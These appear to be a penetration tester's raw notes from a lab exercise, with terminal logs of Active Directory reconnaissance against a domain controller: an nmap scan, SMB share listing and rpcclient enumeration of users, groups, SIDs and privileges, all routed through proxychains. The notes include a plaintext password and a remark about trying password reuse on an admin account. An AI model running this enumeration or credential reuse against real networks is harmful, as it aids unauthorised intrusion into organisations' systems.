```bash
Nmap scan report for 172.16.1.200
Host is up (0.081s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

```
#DC0
```bash
# was able to list drives for joe on DC0
[root💀~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-08 17:30:35] 
 └─╼ # proxychains smbclient -L \\\\172.16.1.200\\ -U joe
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.200:445  ...  OK
Password for [WORKGROUP\joe]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.200:139  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.200:139  ...  OK
do_connect: Connection to 172.16.1.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

#testing
Dev0ftheyear!
proxychains smbclient -L \\\\172.16.1.200\\ADMIN$ -U joe

# able to connect to IPC$ / NETLOGON & SYSVOL using below command on DC - nothing available
[root💀~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-08 17:39:21] 
 └─╼ # proxychains smbclient \\\\172.16.1.200\\SYSVOL -U joe
```

## RPC CLIENT INFO
```bash
# on DC as joe 
[root💀~/bugs_offshore/172.16.1.201] [10.10.14.39] [2023-08-08 17:03:28] 
 └─╼ # proxychains rpcclient -A rpc_joe 172.16.1.200
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.200:445  ...  OK
rpcclient $> 

rpcclient $> getusername
Account Name: joe, Authority Name: LAB

#SHOWS DOMAIN USERS
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[joe] rid:[0x44f]
user:[joe_adm] rid:[0x450]    # NEW JOE_ADM USER HERE, COULD TRY TO PASSWORD REUSE

#SHOWS DOMAIN GROUPS
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Workstation Admins] rid:[0x451]

# LOOKING UP ADMINISTRATOR NAMES
rpcclient $> lookupnames administrators
administrators S-1-5-32-544 (Local Group: 4)

#LOOKING UP ADMINISTRATOR SID
rpcclient $> lookupnames administrator
administrator S-1-5-21-1829430034-4184737329-2133336930-500 (User: 1)
rpcclient $> 

# RID OF ADMINISTRATORS FROM ABOVE
rpcclient $> querygroup 0x200
	Group Name:	Domain Admins
	Description:	Designated administrators of the domain
	Group Attribute:7
	Num Members:1
#user query information
rpcclient $> queryuser Administrator
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Tue, 08 Aug 2023 17:15:41 EDT
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Sun, 11 Oct 2020 23:44:18 EDT
	Password can change Time :	Mon, 12 Oct 2020 23:44:18 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000ffff
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser joe_adm
	User Name   :	joe_adm
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Mon, 12 Oct 2020 00:05:15 EDT
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Sun, 11 Oct 2020 22:17:54 EDT
	Password can change Time :	Mon, 12 Oct 2020 22:17:54 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x450
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000001
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser joe
	User Name   :	joe
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 13 Jul 2023 14:37:07 EDT
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Sun, 18 Oct 2020 16:20:00 EDT
	Password can change Time :	Mon, 19 Oct 2020 16:20:00 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x44f
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000003
	padding1[0..7]...
	logon_hrs[0..21]...

# DC Privileges - SEIMPERSONATE
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege 		0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
SeLockMemoryPrivilege 		0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTcbPrivilege 		0:7 (0x0:0x7)
SeSecurityPrivilege 		0:8 (0x0:0x8)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeLoadDriverPrivilege 		0:10 (0x0:0xa)
SeSystemProfilePrivilege 		0:11 (0x0:0xb)
SeSystemtimePrivilege 		0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SeUndockPrivilege 		0:25 (0x0:0x19)
SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
SeManageVolumePrivilege 		0:28 (0x0:0x1c)
SeImpersonatePrivilege 		0:29 (0x0:0x1d)
SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
SeRelabelPrivilege 		0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
SeTimeZonePrivilege 		0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)

```